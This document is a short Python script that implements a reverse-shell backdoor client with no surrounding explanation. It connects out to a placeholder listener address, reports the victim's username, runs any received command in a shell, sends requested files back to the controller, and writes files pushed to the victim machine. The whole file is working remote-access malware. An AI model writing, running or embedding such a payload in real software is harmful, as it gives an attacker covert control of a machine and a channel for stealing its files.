from socket import socket , AF_INET , SOCK_STREAM
from subprocess import getoutput , check_output , STDOUT
from os import chdir , getcwd
from platform import uname
from getpass import getuser
import struct
client = socket(AF_INET,SOCK_STREAM)
client.connect(("lhost",lport))
user = getuser()


def shell(command):
       try:
       		output = check_output(command,stderr=STDOUT , shell=True)
       		return output
       except Exception as e:
       		return str(e).encode('utf-8')
       		

#send and receive
def recvall(n):
	packet = b''
	while len(packet) < n:
		frame = client.recv(n - len(packet))
		if not frame:return None
		packet += frame
	return packet

def send(data):
	pkt = struct.pack('>I', len(data)) + data
	client.sendall(pkt)
def recv():
	pktlen = recvall(4)
	if not pktlen: return ""
	pktlen = struct.unpack('>I', pktlen)[0]
	return recvall(pktlen)




send(user.encode('utf-8'))
while 1:
	command = recv()
	d_command = command.decode('utf-8')
	if d_command.lower() == "exit":
		client.close()
		exit()
	elif d_command[:2].lower() == "cd":
		try:
			dir = d_command.split()[1]
			chdir(dir)
			send(b' ')
		except Exception as e:
			send(str(e).encode('utf-8'))
    	
    
	elif d_command[:8].lower() == 'download':
		try:
			file = d_command.split()[1]
			cwd = getcwd()
			with open(f'{cwd}/{file}' , 'rb') as file:
				content = file.read()
				file.close()
			send(content)
		except Exception as e:
			send(str(e).encode('utf-8'))

	elif d_command[:6].lower() == 'upload':
		try:
			content = recv()
			file_name = d_command.split()[2]
			with open(file_name,'wb') as file:
				file.write(content)
				file.close()
		except Exception as e:
			send(str(e).encode('utf-8'))
	else:
		send(shell(command))